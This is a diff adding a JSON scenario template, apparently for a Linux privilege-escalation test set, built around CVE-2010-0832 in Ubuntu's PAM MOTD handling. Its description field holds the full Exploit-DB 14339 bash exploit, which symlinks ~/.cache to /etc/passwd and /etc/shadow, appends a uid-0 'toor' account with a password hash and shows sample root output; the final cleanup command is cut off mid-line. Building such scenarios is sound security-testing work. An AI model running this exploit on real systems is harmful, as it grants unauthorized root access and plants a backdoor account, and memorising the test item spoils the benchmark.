@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_14339",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) (CVE-2010-0832)\n\nExploit source code (14339.sh):\n```\n#!/bin/bash\n#\n# Exploit Title: Ubuntu PAM MOTD local root\n# Date: July 9, 2010\n# Author: Anonymous\n# Software Link: http://packages.ubuntu.com/\n# Version: pam-1.1.0\n# Tested on: Ubuntu 9.10 (Karmic Koala), Ubuntu 10.04 LTS (Lucid Lynx)\n# CVE: CVE-2010-0832\n# Patch Instructions: sudo aptitude -y update; sudo aptitude -y install libpam~n~i\n# References: http://www.exploit-db.com/exploits/14273/ by Kristian Erik Hermansen\n#\n# Local root by adding temporary user toor:toor with id 0 to /etc/passwd & /etc/shadow.\n# Does not prompt for login by creating temporary SSH key and authorized_keys entry.\n#\n#   user@ubuntu:~$ bash ubuntu-pam-motd-localroot.sh\n#   [*] Ubuntu PAM MOTD local root\n#   [*] Backuped /home/user/.ssh/authorized_keys\n#   [*] SSH key set up\n#   [*] Backuped /home/user/.cache\n#   [*] spawn ssh\n#   [+] owned: /etc/passwd\n#   [*] spawn ssh\n#   [+] owned: /etc/shadow\n#   [*] Restored /home/user/.cache\n#   [*] Restored /home/user/.ssh/authorized_keys\n#   [*] SSH key removed\n#   [+] Success! Use password toor to get root\n#   Password:\n#   root@ubuntu:/home/user# id\n#   uid=0(root) gid=0(root) groupes=0(root)\n#\nP='toor:x:0:0:root:/root:/bin/bash'\nS='toor:$6$tPuRrLW7$m0BvNoYS9FEF9/Lzv6PQospujOKt0giv.7JNGrCbWC1XdhmlbnTWLKyzHz.VZwCcEcYQU5q2DLX.cI7NQtsNz1:14798:0:99999:7:::'\necho \"[*] Ubuntu PAM MOTD local root\"\n[ -z \"$(which ssh)\" ] && echo \"[-] ssh is a requirement\" && exit 1\n[ -z \"$(which ssh-keygen)\" ] && echo \"[-] ssh-keygen is a requirement\" && exit 1\n[ -z \"$(ps -u root |grep sshd)\" ] && echo \"[-] a running sshd is a requirement\" && exit 1\nbackup() {\n    [ -e \"$1\" ] && [ -e \"$1\".bak ] && rm -rf \"$1\".bak\n    [ -e \"$1\" ] || return 0\n    mv \"$1\"{,.bak} || return 1\n    echo \"[*] Backuped $1\"\n}\nrestore() {\n    [ -e \"$1\" ] && rm -rf \"$1\"\n    [ -e \"$1\".bak ] || return 0\n    mv \"$1\"{.bak,} || return 1\n    echo \"[*] Restored $1\"\n}\nkey_create() {\n    backup ~/.ssh/authorized_keys\n    ssh-keygen -q -t rsa -N '' -C 'pam' -f \"$KEY\" || return 1\n    [ ! -d ~/.ssh ] && { mkdir ~/.ssh || return 1; }\n    mv \"$KEY.pub\" ~/.ssh/authorized_keys || return 1\n    echo \"[*] SSH key set up\"\n}\nkey_remove() {\n    rm -f \"$KEY\"\n    restore ~/.ssh/authorized_keys\n    echo \"[*] SSH key removed\"\n}\nown() {\n    [ -e ~/.cache ] && rm -rf ~/.cache\n    ln -s \"$1\" ~/.cache || return 1\n    echo \"[*] spawn ssh\"\n    ssh -o 'NoHostAuthenticationForLocalhost yes' -i \"$KEY\" localhost true\n    [ -w \"$1\" ] || { echo \"[-] Own $1 failed\"; restore ~/.cache; bye; }\n    echo \"[+] owned: $1\"\n}\nbye() {\n    key_remove\n    exit 1\n}\nKEY=\"$(mktemp -u)\"\nkey_create || { echo \"[-] Failed to setup SSH key\"; exit 1; }\nbackup ~/.cache || { echo \"[-] Failed to backup ~/.cache\"; bye; }\nown /etc/passwd && echo \"$P\" >> /etc/passwd\nown /etc/shadow && echo \"$S\" >> /etc/shadow\nrestore ~/.cache || { echo \"[-] Failed to restore ~/.cache\"; bye; }\nkey_remove\necho \"[+] Success! Use password toor to get root\"\nsu -c \"sed -i '/toor:/d' /etc/{passwd,shadow}; chown root: /etc/{passwd,shadow}; \\\n  chgrp shadow /etc/shadow; \n```",
+  "cve": "CVE-2010-0832",
+  "exploitdb_id": "14339",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_14339",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
